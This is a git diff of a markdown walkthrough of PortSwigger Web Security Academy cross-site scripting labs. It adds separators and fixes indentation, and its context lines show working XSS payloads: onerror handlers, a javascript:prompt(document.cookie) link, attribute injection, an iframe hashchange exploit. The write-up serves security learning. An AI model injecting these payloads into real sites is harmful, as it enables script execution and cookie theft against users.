@@ -128,6 +128,7 @@ Result: <img src="/resources/images/tracker[.]gif?searchTerms=">
         <script src="x" onerror="javascript:alert('XSS')"></script>
 ~~~
 </details>
+-
 
 #### 2. DOM XSS in innerHTML sink using source location.search
 The application It assigns data from `location.search` to `innerHTML`, which updates the contents of a `<div>`. Since the URL can be controlled by the user, they can inject malicious HTML or scripts.
@@ -151,6 +152,7 @@ URL: https[://]web-security-academy[.]net/?search=</span><img src=x onerror="&#0
 Result: <span id="searchMessage"><img src="x" onerror="javascript:alert('XSS')"></span> <span>'</span> == $0
 ~~~
 </details>
+-
 
 #### 3. DOM XSS in jQuery anchor href attribute sink using location.search source
 In this instance, jQuery’s `$` selector is used to find a link and set its `href` using data from `location.search`, which comes from the URL query string.
@@ -172,6 +174,7 @@ URL: https[://]web-security-academy[.]net/feedback?returnPath=javascript:prompt(
 Result: <a id="backLink" href="javascript:prompt(document.cookie)">Back</a>
 ~~~
 </details>
+-
 
 #### 4. Stored XSS into anchor href attribute with double quotes HTML-encoded
 This instance contains a stored XSS vulnerability in the comment section. I submit a comment that triggers an alert when the author’s name is clicked.
@@ -190,6 +193,7 @@ Website: javascript:alert('Zebra!')
 Result: <a id="author" href="javascript:alert('Zebra!')">World Smartest Zebra</a>
 ~~~
 </details>
+-
 
 #### 5. Reflected XSS into attribute with angle brackets HTML-encoded
 The application contains a reflected XSS vulnerability in the search blog feature, where angle brackets are HTML-encoded. I inject an attribute via XSS that triggers an alert function.
@@ -215,16 +219,17 @@ Result: <input type="text" placeholder="Search the blog..." name="search" value=
 
 4. Once I hover the cursor over the search bar, it triggers the alert. I identify the XSS vulnerability.
 </details>
+-
 
 #### 5. DOM XSS in jQuery selector sink using a hashchange event
 There is a DOM-based XSS vulnerability on the home page, where jQuery’s `$()` selector is used to auto-scroll to a post, with the title passed through `location.hash`.
 <details markdown="1">
   <summary>Click me to expand the process</summary>
 1. Firstly, I search for `$()` in the inspection tab, and I find the syntax for this function. Which listens for hash changes in the URL (`/#`) and scrolls the corresponding blog post into view based on the hash value.
->  $(window).on('hashchange', function(){  
->    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');  
->    if (post) post.get(0).scrollIntoView();  
->  });  
+  >  $(window).on('hashchange', function(){  
+  >    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');  
+  >    if (post) post.get(0).scrollIntoView();  
+  >  });  
   
 2. I append a simple XSS test payload with a hashtag to the URL, and the print function is triggered. The XSS vulnerability in this application is confirmed.
 ~~~
@@ -238,7 +243,8 @@ URL: <iframe src="https[://]web-security-academy[.]net/#" onload="this.src+='<im
 {: .box-note}
 **Note:** The `onload` attribute of the `iframe` runs JavaScript to append the print payload directly into the URL fragment after the page loads. The vulnerable page inside the iframe then reads this fragment (<img src=x onerror=print()>) and executes the injected payload.
 
-</details>x
+</details>
+-
 
 #### 6. Reflected XSS into a JavaScript string with angle brackets HTML encoded
 In this instance, the application is vulnerable to reflected XSS in the search query tracking functionality, where angle brackets are encoded. The reflection occurs inside a JavaScript string. I breaks out of the JavaScript string and triggers the alert() function, to demonstrate the vulnerability.
